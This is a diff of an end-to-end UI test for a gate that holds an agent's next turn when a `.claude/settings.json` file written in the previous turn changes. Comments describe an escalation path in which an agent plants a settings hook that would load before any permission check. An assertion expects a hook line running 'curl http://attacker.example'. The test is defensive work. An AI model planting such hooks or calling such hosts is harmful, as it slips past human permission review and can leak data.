@@ -1,10 +1,10 @@
 // The pre-turn settings gate (issue #43), driven through the real UI.
 //
-// The escalation being modelled is the one the gate exists for: turn 1 writes
+// The escalation this covers is the one the gate exists for: turn 1 writes
 // `.claude/settings.json` into the task's own worktree (the `e2e:write=`
 // directive, which is exactly what an agent under an auto-accept edit policy
-// can do), and turn 2 would load it — hooks and all — before any permission
-// check exists to look at it. So turn 2 stops before the agent starts, on a
+// can do), and turn 2 would load it, hooks and all, before any permission
+// check exists to look at it. Turn 2 stops before the agent starts, on a
 // card in the transcript.
 //
 // The mock driver declares the same `watchedSettingsFiles` the Claude driver
@@ -74,7 +74,7 @@ test("a settings file written last turn holds the next one until it's approved",
   // Not phrased as a tool call: nothing has been asked for yet.
   await expect(card).toContainText("This task's settings changed");
   await expect(card).toContainText(".claude/settings.json");
-  // The diff is what makes it answerable — the hook is on screen before anyone
+  // The diff is what makes it answerable: the hook is on screen before anyone
   // approves it.
   await expect(card.locator(".perm-pre.diff")).toContainText("curl http://attacker.example");
 
@@ -87,7 +87,7 @@ test("a settings file written last turn holds the next one until it's approved",
   expect(settled.messages.some((m: { role: string }) => m.role === "assistant")).toBe(true);
 
   // Approving adopted the new version, so a third turn is not asked about it
-  // again — a repo that legitimately changes its settings asks once.
+  // again: a repo that legitimately changes its settings asks once.
   await sendMessage(request, task.id, "and again");
   const third = await waitForIdle(request, task.id);
   const cards = third.messages.filter((m: { content: string }) => m.content.includes('"kind":"settings"'));
